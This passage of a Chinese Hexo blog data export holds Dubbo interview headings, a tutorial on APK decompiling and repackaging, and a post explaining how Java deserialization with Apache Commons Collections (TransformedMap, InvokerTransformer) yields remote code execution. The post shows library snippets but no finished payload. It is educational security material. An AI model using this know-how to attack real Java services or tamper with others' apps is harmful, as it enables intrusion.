href=\"#4、Dubbo启动的时候支持几种配置方式\" class=\"headerlink\" title=\"4、Dubbo启动的时候支持几种配置方式\"></a>4、Dubbo启动的时候支持几种配置方式</h3><h3 id=\"5、消息中间件如何保证消息的一致性和如何进行消息的重试机制？\"><a href=\"#5、消息中间件如何保证消息的一致性和如何进行消息的重试机制？\" class=\"headerlink\" title=\"5、消息中间件如何保证消息的一致性和如何进行消息的重试机制？\"></a>5、消息中间件如何保证消息的一致性和如何进行消息的重试机制？</h3><h3 id=\"6、Spring-Cloud熔断机制\"><a href=\"#6、Spring-Cloud熔断机制\" class=\"headerlink\" title=\"6、Spring Cloud熔断机制\"></a>6、Spring Cloud熔断机制</h3><script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"1、Dubbo完整的一次调用链路介绍\"><a href=\"#1、Dubbo完整的一次调用链路介绍\" class=\"headerlink\" title=\"1、Dubbo完整的一次调用链路介绍\"></a>1、Dubbo完整的一次调用链路介绍</h3><h3 id=\"2、Dubbo支持几种负载均衡策略\"><a href=\"#2、Dubbo支持几种负载均衡策略\" class=\"headerlink\" title=\"2、Dubbo支持几种负载均衡策略\"></a>2、Dubbo支持几种负载均衡策略</h3><h3 id=\"3、Dubbo-Provider服务提供者想要控制执行并发请求上限，具体怎么做？\"><a href=\"#3、Dubbo-Provider服务提供者想要控制执行并发请求上限，具体怎么做？\" class=\"headerlink\" title=\"3、Dubbo Provider服务提供者想要控制执行并发请求上限，具体怎么做？\"></a>3、Dubbo Provider服务提供者想要控制执行并发请求上限，具体怎么做？</h3><h3 id=\"4、Dubbo启动的时候支持几种配置方式\"><a href=\"#4、Dubbo启动的时候支持几种配置方式\" class=\"headerlink\" title=\"4、Dubbo启动的时候支持几种配置方式\"></a>4、Dubbo启动的时候支持几种配置方式</h3><h3 id=\"5、消息中间件如何保证消息的一致性和如何进行消息的重试机制？\"><a href=\"#5、消息中间件如何保证消息的一致性和如何进行消息的重试机制？\" class=\"headerlink\" title=\"5、消息中间件如何保证消息的一致性和如何进行消息的重试机制？\"></a>5、消息中间件如何保证消息的一致性和如何进行消息的重试机制？</h3><h3 id=\"6、Spring-Cloud熔断机制\"><a href=\"#6、Spring-Cloud熔断机制\" class=\"headerlink\" title=\"6、Spring Cloud熔断机制\"></a>6、Spring Cloud熔断机制</h3><script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"Java反序列化漏洞浅析","date":"2018-11-13T03:33:48.000Z","_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 0x01 前言\n{% endnote %}\n</div>\n\n2015年11月6日FoxGlove Security安全团队的@breenmachine 发布了一篇长博客，介绍了如何利用Java反序列化漏洞，来攻击最新的Jenkins、Jboss、WebLogic等java应用，实现远程代码执行漏洞。\n\n事实上，早在2015年的1月28号，Gabriel Lawrence (@gebl)和Chris Frohoff (@frohoff)在AppSecCali上给出了一个报告[5]，报告中介绍了Java反序列化漏洞可以利用Apache Commons Collections这个常用的Java库来实现任意代码执行。\n\n确实，Apache Commons Collection这样的基础类库有非常多的Java应用都在用，一旦编程人员误用了反序列化机制，使得用户的输入可以直接被反序列化，就能导致任意代码执行，这是一个极其严重的事情。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 0x02 Java序列化和反序列化\n{% endnote %}\n</div>\n\n今天我们就以Java的反序列化漏洞做一个简单的分析。在这之前先了解一下Java的序列化和反序列化。\n\n> 序列化就是把对象的状态信息转换为字节序列(即可以存储或传输的形式)过程\n> 反序列化即逆过程，将字节流还原为对象\n\njava序列化经常用在把对象的字节序列存储在磁盘上，另一个用途是在网络上传输对象。例如最常见的是web服务器中Session对象，当有10万用户并发访问，就有可能出现10万个session对象，内存可能吃不消，于是web容器就会把一些session先序列化到硬盘中，等要用的时候，再把保存在磁盘上的对象加载到内存中。\n\nJava中的ObjectOutputStream类的`writeObject` 方法可以实现序列化，类`ObjectInputStream`类的readObject方法可以用于反序列化。下面是一个将字符串对象先进行序列化存储到本地文件，在通过反序列化进行恢复的代码。\n\n```java\npublic class TestSerialize(){\n\tpublic static void main(String[] args){\n\t\tString s = \"test\";\n\n\t\t// 将序列化对象写入文件中\n\t\tFileOutputStream fos = new FileOutputStream(\"object.ser\");\n\t\tObjectOutputStream os = new ObjectOutputStream(fos);\n\t\tos.writeObject(s);\n\t\tos.close;\n\n\t\t// 从文件中读取对象\n\t\tFileInputStream fis = new FileInputStream(\"object.ser\");\n\t\tObjectInputStream ois = new ObjectInputStream(fis);\n\n\t\t// 通过反序列化恢复对象\n\t\tString s1 = (String)ois.readObject();\n\t\tois.close();\n\t}\n}\n```\n\n问题在于，如果java应用对于用户输入，即不可信的数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象产生过程中就有可能带来任意代码执行。\n\n所以这个问题的根源在于`ObjecInputStream`在反序列化时，没有对生成的对象的类型做限制。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 0x03 利用Apache Commons Collections实现远程代码执行\n{% endnote %}\n</div>\n\n本篇以Apache Commons Collections为例，来解释如何构造对象，能够让程序在反序列化时，即调用readObject()时，就能直接实现远程代码执行。\n\nJava中Map是存储键值对的数据结构。在Apache Commons Collections中实现了类`TransformedMap`，用来对Map进行某种转换，只需要调用`decorate()`函数，传入key和value的变换函数`Transformer`，就可以从任意Map对象生成相应的`TransformedMap`，decorate的函数如下：\n\n```java\npublic static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer){\n\treturn new TransformedMap(map, keyTransformer, valueTransformer);\n}\n```\n\n`Transformer`是一个接口，其中定义的`transform()`函数用来将一个对象转换为另一个对象，如下所示：\n\n```java\npublic interface Transformer{\n\tpublic Object transform(Object input);\n}\n```\n\n当Map中的任意key或value更改时，相应的`Transformer`就会被调用。除此之外，多个Trnansformer还能串起来，形成调用链`ChainedTransformer`。Apache Commons Collections已经实现了一些`Transformer`，其中有一个可以通过java的反射机制调用任意函数，叫做`InvokerTransformer`,代码如下：\n\n```java\npublic class InvokerTransformer implements Transformer, Serializable{\n\t...\n\tpublic InvokerTransformer(String methodName, Class[] paramTypes, Object[] args){\n\t\t\n\t}\n}\n```\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/Java反序列化漏洞浅析.md","raw":"---\ntitle: Java反序列化漏洞浅析\ndate: 2018-11-13 11:33:48\ntags: ['安全','反序列化','Java','漏洞']\ncategories: 安全\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 0x01 前言\n{% endnote %}\n</div>\n\n2015年11月6日FoxGlove Security安全团队的@breenmachine 发布了一篇长博客，介绍了如何利用Java反序列化漏洞，来攻击最新的Jenkins、Jboss、WebLogic等java应用，实现远程代码执行漏洞。\n\n事实上，早在2015年的1月28号，Gabriel Lawrence (@gebl)和Chris Frohoff (@frohoff)在AppSecCali上给出了一个报告[5]，报告中介绍了Java反序列化漏洞可以利用Apache Commons Collections这个常用的Java库来实现任意代码执行。\n\n确实，Apache Commons Collection这样的基础类库有非常多的Java应用都在用，一旦编程人员误用了反序列化机制，使得用户的输入可以直接被反序列化，就能导致任意代码执行，这是一个极其严重的事情。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 0x02 Java序列化和反序列化\n{% endnote %}\n</div>\n\n今天我们就以Java的反序列化漏洞做一个简单的分析。在这之前先了解一下Java的序列化和反序列化。\n\n> 序列化就是把对象的状态信息转换为字节序列(即可以存储或传输的形式)过程\n> 反序列化即逆过程，将字节流还原为对象\n\njava序列化经常用在把对象的字节序列存储在磁盘上，另一个用途是在网络上传输对象。例如最常见的是web服务器中Session对象，当有10万用户并发访问，就有可能出现10万个session对象，内存可能吃不消，于是web容器就会把一些session先序列化到硬盘中，等要用的时候，再把保存在磁盘上的对象加载到内存中。\n\nJava中的ObjectOutputStream类的`writeObject` 方法可以实现序列化，类`ObjectInputStream`类的readObject方法可以用于反序列化。下面是一个将字符串对象先进行序列化存储到本地文件，在通过反序列化进行恢复的代码。\n\n```java\npublic class TestSerialize(){\n\tpublic static void main(String[] args){\n\t\tString s = \"test\";\n\n\t\t// 将序列化对象写入文件中\n\t\tFileOutputStream fos = new FileOutputStream(\"object.ser\");\n\t\tObjectOutputStream os = new ObjectOutputStream(fos);\n\t\tos.writeObject(s);\n\t\tos.close;\n\n\t\t// 从文件中读取对象\n\t\tFileInputStream fis = new FileInputStream(\"object.ser\");\n\t\tObjectInputStream ois = new ObjectInputStream(fis);\n\n\t\t// 通过反序列化恢复对象\n\t\tString s1 = (String)ois.readObject();\n\t\tois.close();\n\t}\n}\n```\n\n问题在于，如果java应用对于用户输入，即不可信的数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象产生过程中就有可能带来任意代码执行。\n\n所以这个问题的根源在于`ObjecInputStream`在反序列化时，没有对生成的对象的类型做限制。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 0x03 利用Apache Commons Collections实现远程代码执行\n{% endnote %}\n</div>\n\n本篇以Apache Commons Collections为例，来解释如何构造对象，能够让程序在反序列化时，即调用readObject()时，就能直接实现远程代码执行。\n\nJava中Map是存储键值对的数据结构。在Apache Commons Collections中实现了类`TransformedMap`，用来对Map进行某种转换，只需要调用`decorate()`函数，传入key和value的变换函数`Transformer`，就可以从任意Map对象生成相应的`TransformedMap`，decorate的函数如下：\n\n```java\npublic static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer){\n\treturn new TransformedMap(map, keyTransformer, valueTransformer);\n}\n```\n\n`Transformer`是一个接口，其中定义的`transform()`函数用来将一个对象转换为另一个对象，如下所示：\n\n```java\npublic interface Transformer{\n\tpublic Object transform(Object input);\n}\n```\n\n当Map中的任意key或value更改时，相应的`Transformer`就会被调用。除此之外，多个Trnansformer还能串起来，形成调用链`ChainedTransformer`。Apache Commons Collections已经实现了一些`Transformer`，其中有一个可以通过java的反射机制调用任意函数，叫做`InvokerTransformer`,代码如下：\n\n```java\npublic class InvokerTransformer implements Transformer, Serializable{\n\t...\n\tpublic InvokerTransformer(String methodName, Class[] paramTypes, Object[] args){\n\t\t\n\t}\n}\n```\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"Java反序列化漏洞浅析","published":1,"updated":"2019-06-26T03:52:03.498Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2fw0004o25tdq4wm2sx","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"0x01-前言\"><a href=\"#0x01-前言\" class=\"headerlink\" title=\"0x01 前言\"></a>0x01 前言</h3></div><br></div>\n\n<p>2015年11月6日FoxGlove Security安全团队的@breenmachine 发布了一篇长博客，介绍了如何利用Java反序列化漏洞，来攻击最新的Jenkins、Jboss、WebLogic等java应用，实现远程代码执行漏洞。</p>\n<p>事实上，早在2015年的1月28号，Gabriel Lawrence (@gebl)和Chris Frohoff (@frohoff)在AppSecCali上给出了一个报告[5]，报告中介绍了Java反序列化漏洞可以利用Apache Commons Collections这个常用的Java库来实现任意代码执行。</p>\n<p>确实，Apache Commons Collection这样的基础类库有非常多的Java应用都在用，一旦编程人员误用了反序列化机制，使得用户的输入可以直接被反序列化，就能导致任意代码执行，这是一个极其严重的事情。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"0x02-Java序列化和反序列化\"><a href=\"#0x02-Java序列化和反序列化\" class=\"headerlink\" title=\"0x02 Java序列化和反序列化\"></a>0x02 Java序列化和反序列化</h3></div><br></div>\n\n<p>今天我们就以Java的反序列化漏洞做一个简单的分析。在这之前先了解一下Java的序列化和反序列化。</p>\n<blockquote>\n<p>序列化就是把对象的状态信息转换为字节序列(即可以存储或传输的形式)过程<br>反序列化即逆过程，将字节流还原为对象</p>\n</blockquote>\n<p>java序列化经常用在把对象的字节序列存储在磁盘上，另一个用途是在网络上传输对象。例如最常见的是web服务器中Session对象，当有10万用户并发访问，就有可能出现10万个session对象，内存可能吃不消，于是web容器就会把一些session先序列化到硬盘中，等要用的时候，再把保存在磁盘上的对象加载到内存中。</p>\n<p>Java中的ObjectOutputStream类的<code>writeObject</code> 方法可以实现序列化，类<code>ObjectInputStream</code>类的readObject方法可以用于反序列化。下面是一个将字符串对象先进行序列化存储到本地文件，在通过反序列化进行恢复的代码。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> class <span class=\"title\">TestSerialize</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span>&#123;</span><br><span class=\"line\">\t\tString s = <span class=\"string\">\"test\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// 将序列化对象写入文件中</span></span><br><span class=\"line\">\t\tFileOutputStream fos = <span class=\"keyword\">new</span> FileOutputStream(<span class=\"string\">\"object.ser\"</span>);</span><br><span class=\"line\">\t\tObjectOutputStream os = <span class=\"keyword\">new</span> ObjectOutputStream(fos);</span><br><span class=\"line\">\t\tos.writeObject(s);</span><br><span class=\"line\">\t\tos.close;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// 从文件中读取对象</span></span><br><span class=\"line\">\t\tFileInputStream fis = <span class=\"keyword\">new</span> FileInputStream(<span class=\"string\">\"object.ser\"</span>);</span><br><span class=\"line\">\t\tObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(fis);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// 通过反序列化恢复对象</span></span><br><span class=\"line\">\t\tString s1 = (String)ois.readObject();</span><br><span class=\"line\">\t\tois.close();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>问题在于，如果java应用对于用户输入，即不可信的数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象产生过程中就有可能带来任意代码执行。</p>\n<p>所以这个问题的根源在于<code>ObjecInputStream</code>在反序列化时，没有对生成的对象的类型做限制。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"0x03-利用Apache-Commons-Collections实现远程代码执行\"><a href=\"#0x03-利用Apache-Commons-Collections实现远程代码执行\" class=\"headerlink\" title=\"0x03 利用Apache Commons Collections实现远程代码执行\"></a>0x03 利用Apache Commons Collections实现远程代码执行</h3></div><br></div>\n\n<p>本篇以Apache Commons Collections为例，来解释如何构造对象，能够让程序在反序列化时，即调用readObject()时，就能直接实现远程代码执行。</p>\n<p>Java中Map是存储键值对的数据结构。在Apache Commons Collections中实现了类<code>TransformedMap</code>，用来对Map进行某种转换，只需要调用<code>decorate()</code>函数，传入key和value的变换函数<code>Transformer</code>，就可以从任意Map对象生成相应的<code>TransformedMap</code>，decorate的函数如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Map <span class=\"title\">decorate</span><span class=\"params\">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"keyword\">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>Transformer</code>是一个接口，其中定义的<code>transform()</code>函数用来将一个对象转换为另一个对象，如下所示：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">Transformer</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">transform</span><span class=\"params\">(Object input)</span></span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当Map中的任意key或value更改时，相应的<code>Transformer</code>就会被调用。除此之外，多个Trnansformer还能串起来，形成调用链<code>ChainedTransformer</code>。Apache Commons Collections已经实现了一些<code>Transformer</code>，其中有一个可以通过java的反射机制调用任意函数，叫做<code>InvokerTransformer</code>,代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">InvokerTransformer</span> <span class=\"keyword\">implements</span> <span class=\"title\">Transformer</span>, <span class=\"title\">Serializable</span></span>&#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">InvokerTransformer</span><span class=\"params\">(String methodName, Class[] paramTypes, Object[] args)</span></span>&#123;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"0x01-前言\"><a href=\"#0x01-前言\" class=\"headerlink\" title=\"0x01 前言\"></a>0x01 前言</h3></div><br></div>\n\n<p>2015年11月6日FoxGlove Security安全团队的@breenmachine 发布了一篇长博客，介绍了如何利用Java反序列化漏洞，来攻击最新的Jenkins、Jboss、WebLogic等java应用，实现远程代码执行漏洞。</p>\n<p>事实上，早在2015年的1月28号，Gabriel Lawrence (@gebl)和Chris Frohoff (@frohoff)在AppSecCali上给出了一个报告[5]，报告中介绍了Java反序列化漏洞可以利用Apache Commons Collections这个常用的Java库来实现任意代码执行。</p>\n<p>确实，Apache Commons Collection这样的基础类库有非常多的Java应用都在用，一旦编程人员误用了反序列化机制，使得用户的输入可以直接被反序列化，就能导致任意代码执行，这是一个极其严重的事情。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"0x02-Java序列化和反序列化\"><a href=\"#0x02-Java序列化和反序列化\" class=\"headerlink\" title=\"0x02 Java序列化和反序列化\"></a>0x02 Java序列化和反序列化</h3></div><br></div>\n\n<p>今天我们就以Java的反序列化漏洞做一个简单的分析。在这之前先了解一下Java的序列化和反序列化。</p>\n<blockquote>\n<p>序列化就是把对象的状态信息转换为字节序列(即可以存储或传输的形式)过程<br>反序列化即逆过程，将字节流还原为对象</p>\n</blockquote>\n<p>java序列化经常用在把对象的字节序列存储在磁盘上，另一个用途是在网络上传输对象。例如最常见的是web服务器中Session对象，当有10万用户并发访问，就有可能出现10万个session对象，内存可能吃不消，于是web容器就会把一些session先序列化到硬盘中，等要用的时候，再把保存在磁盘上的对象加载到内存中。</p>\n<p>Java中的ObjectOutputStream类的<code>writeObject</code> 方法可以实现序列化，类<code>ObjectInputStream</code>类的readObject方法可以用于反序列化。下面是一个将字符串对象先进行序列化存储到本地文件，在通过反序列化进行恢复的代码。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> class <span class=\"title\">TestSerialize</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span>&#123;</span><br><span class=\"line\">\t\tString s = <span class=\"string\">\"test\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// 将序列化对象写入文件中</span></span><br><span class=\"line\">\t\tFileOutputStream fos = <span class=\"keyword\">new</span> FileOutputStream(<span class=\"string\">\"object.ser\"</span>);</span><br><span class=\"line\">\t\tObjectOutputStream os = <span class=\"keyword\">new</span> ObjectOutputStream(fos);</span><br><span class=\"line\">\t\tos.writeObject(s);</span><br><span class=\"line\">\t\tos.close;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// 从文件中读取对象</span></span><br><span class=\"line\">\t\tFileInputStream fis = <span class=\"keyword\">new</span> FileInputStream(<span class=\"string\">\"object.ser\"</span>);</span><br><span class=\"line\">\t\tObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(fis);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// 通过反序列化恢复对象</span></span><br><span class=\"line\">\t\tString s1 = (String)ois.readObject();</span><br><span class=\"line\">\t\tois.close();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>问题在于，如果java应用对于用户输入，即不可信的数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象产生过程中就有可能带来任意代码执行。</p>\n<p>所以这个问题的根源在于<code>ObjecInputStream</code>在反序列化时，没有对生成的对象的类型做限制。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"0x03-利用Apache-Commons-Collections实现远程代码执行\"><a href=\"#0x03-利用Apache-Commons-Collections实现远程代码执行\" class=\"headerlink\" title=\"0x03 利用Apache Commons Collections实现远程代码执行\"></a>0x03 利用Apache Commons Collections实现远程代码执行</h3></div><br></div>\n\n<p>本篇以Apache Commons Collections为例，来解释如何构造对象，能够让程序在反序列化时，即调用readObject()时，就能直接实现远程代码执行。</p>\n<p>Java中Map是存储键值对的数据结构。在Apache Commons Collections中实现了类<code>TransformedMap</code>，用来对Map进行某种转换，只需要调用<code>decorate()</code>函数，传入key和value的变换函数<code>Transformer</code>，就可以从任意Map对象生成相应的<code>TransformedMap</code>，decorate的函数如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Map <span class=\"title\">decorate</span><span class=\"params\">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"keyword\">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>Transformer</code>是一个接口，其中定义的<code>transform()</code>函数用来将一个对象转换为另一个对象，如下所示：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">Transformer</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">transform</span><span class=\"params\">(Object input)</span></span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当Map中的任意key或value更改时，相应的<code>Transformer</code>就会被调用。除此之外，多个Trnansformer还能串起来，形成调用链<code>ChainedTransformer</code>。Apache Commons Collections已经实现了一些<code>Transformer</code>，其中有一个可以通过java的反射机制调用任意函数，叫做<code>InvokerTransformer</code>,代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">InvokerTransformer</span> <span class=\"keyword\">implements</span> <span class=\"title\">Transformer</span>, <span class=\"title\">Serializable</span></span>&#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">InvokerTransformer</span><span class=\"params\">(String methodName, Class[] paramTypes, Object[] args)</span></span>&#123;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"Android APK 反编译、重打包、签名","date":"2019-01-10T07:39:34.000Z","_content":"\n\n首先声明，反编译别人的APK是一件不厚道的事情，本文抱着学习的态度，学习如何使用工具反编译Android APK。\n\n\n### 一、工具\n\n[apktool](https://ibotpeaches.github.io/Apktool/), 编译和反编译apk，提取图片、布局等资源\n[dex2jar](https://github.com/pxb1988/dex2jar/releases)，将可运行文件class.dex反编译为可读的jar源代码\n[jd-gui](http://jd.benow.ca), 查看jar源代码\n\n### 二、反编译\n\n#### 2.1、 apktool安装\n\n**windows下安装**\n\n1、安装java，配置环境变量\n2、下载最新[apktool.bat](https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/windows/apktool.bat)\n3、下载最新[apktool.jar](https://bitbucket.org/iBotPeaches/apktool/downloads/)\n4、将apktool.bat和apktool.jar放在同一目录下，然后就可以在命令行使用了\n\n##### 2.2、 用法\n\n可以直接在命令行执行apktool.bat使用。这里介绍两个最常用的用法。\n\n**反编译**\n\n```shell\napltool.bat d -o <output_dir> test.apk\n```\n其中<output_dir>指定输出目录，默认为apk名称，test.apk为需要反编译的apk\n\n**编译**\n\n```shell\napltool.bat b -o <output.apk> <input_dir>\n```\n其中<input_dir>为上面反编译输出的目录，<output.apk> 是编译输出的apk\n\napktool反编译后的典型目录如下：\n\n{% asset_img 1.jpg %}\n\n此时，可以查看AndroidMainfest.xml、res、smali文件了。甚至可以修改目录下的资源文件或smali文件，然后重新编译打包发布。值得注意的是，apktool反编译出来的是smali文件，即汇编语言版本，并不能查看源代码。\n\n### 三、查看源代码\n\n查看源代码的话，这里需要用到dex2jar、jd-gui这两个工具。\n\n1、将需要反编译的apk后缀改为rar或zip并解压到一个文件夹，得到其中的class.dex\n2、用dex2jar工具反编译class.dex得到jar文件 classes-dex2jar.jar\n\n{% asset_img 2.jpg %}\n\n3、使用jd-gui打开classes-dex2jar.jar，就可以查看源码了，当然如果代码发布的时候做过混淆，我们也只能看到混淆过的代码。所以代码混淆的重要性不言而喻。\n\n{% 